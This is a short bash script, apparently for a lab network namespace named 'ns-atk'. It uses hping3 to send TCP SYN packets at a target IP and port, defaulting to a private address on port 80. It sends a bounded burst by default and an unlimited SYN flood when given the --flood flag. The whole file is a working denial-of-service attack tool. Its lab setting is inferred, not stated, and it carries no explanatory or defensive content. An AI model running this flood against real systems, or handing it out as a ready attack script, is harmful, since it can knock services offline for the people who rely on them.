#!/usr/bin/env bash
set -euo pipefail

NAMESPACE="${NAMESPACE:-ns-atk}"
TARGET_IP="${TARGET_IP:-10.0.0.10}"
TARGET_PORT="${TARGET_PORT:-80}"
INTERVAL_US="${INTERVAL_US:-1000}"
COUNT="${COUNT:-3000}"

if [[ ${EUID} -ne 0 ]]; then
  echo "[!] Run as root (use sudo)."
  exit 1
fi

if ! command -v hping3 >/dev/null 2>&1; then
  echo "[!] hping3 is required"
  exit 1
fi

if [[ "${1:-}" == "--flood" ]]; then
  echo "[!] Unlimited flood mode. Press Ctrl+C to stop."
  exec ip netns exec "${NAMESPACE}" hping3 -S --flood -p "${TARGET_PORT}" "${TARGET_IP}"
fi

cat <<EOF
[+] Bounded SYN burst
    namespace: ${NAMESPACE}
    target:    ${TARGET_IP}:${TARGET_PORT}
    count:     ${COUNT}
    interval:  ${INTERVAL_US}us
EOF

exec ip netns exec "${NAMESPACE}" hping3 -S -p "${TARGET_PORT}" -i u"${INTERVAL_US}" -c "${COUNT}" "${TARGET_IP}"
